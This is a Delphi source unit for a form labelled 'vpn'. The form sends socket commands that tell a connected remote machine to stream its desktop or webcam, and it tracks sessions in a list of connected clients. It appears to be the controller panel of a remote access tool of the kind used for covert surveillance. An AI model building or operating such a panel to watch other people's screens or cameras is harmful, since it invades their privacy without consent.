unit vpn;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, ScktComp, Vcl.ComCtrls, Vcl.StdCtrls,
  Vcl.ExtCtrls, Vcl.MPlayer, Vcl.OleCtrls;

type
  TForm6 = class(TForm)
    vpnBar: TTrackBar;
    VPN: TGroupBox;
    Ligado: TLabel;
    Desligado: TLabel;
    Memo1: TMemo;
    cb1: TComboBox;
    GroupBox1: TGroupBox;
    Edit1: TEdit;
    btn1: TButton;
    procedure vpnBarChange(Sender: TObject);
    procedure cb1Change(Sender: TObject);
    procedure btn1Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
  private
    { Private declarations }
  public
    Socket: TCustomWinSocket;
    { Public declarations }
  end;

var
  Form6: TForm6;

implementation

{$R *.dfm}

uses Principal;

procedure TForm6.btn1Click(Sender: TObject);
begin
{vlc.BaseURL:='mms://'+Edit1.Text;
vlc.playlist.add('mms://'+Edit1.Text,'Stream','s');
vlc.playlist.play;}
end;

procedure TForm6.cb1Change(Sender: TObject);
begin
  if(cb1.Text='Desktop')then begin
    Socket.SendText('<|vpn|>desktop:'+InputBox('Streaming Desktop','Digite a porta','')+'<<|');
    Socket.SendText('<|vpn|>conect<<|');
    btn1.Enabled:=True;
  {  radio1.Enabled:=False;
    radio2.Enabled:=False;
    radio3.Enabled:=False;}
  end;
  if(cb1.Text='WebCam')then begin
    Socket.SendText('<|vpn|>webcam:'+InputBox('Streaming WebCam','Digite a porta','')+'<<|');
    Socket.SendText('<|vpn|>conect<<|');
    btn1.Enabled:=True;
  end;
  if(cb1.Text='Desativado')then begin
//    vlc.playlist.stop;
    Socket.SendText('<|vpn|>stop<<|');
    btn1.Enabled:=False;
  end;
end;

procedure TForm6.FormClose(Sender: TObject; var Action: TCloseAction);
var
  L: TListItem;
begin
  L := Form1.LV1.FindCaption(0, intToStr(Socket.Handle), false, true, false);
  if L <> nil then
  begin
    L.SubItems.Objects[4] := nil;
  end;
  Destroy;
end;

procedure TForm6.vpnBarChange(Sender: TObject);
begin
if(vpnBar.Position=1)then begin
  memo1.Lines.Clear;
  memo1.Enabled:=False;
  Socket.SendText('<|vpn|>disconect<<|');
end else begin
  Socket.SendText('<|vpn|>conect<<|');
  memo1.Enabled:=True;
end;
end;

end.
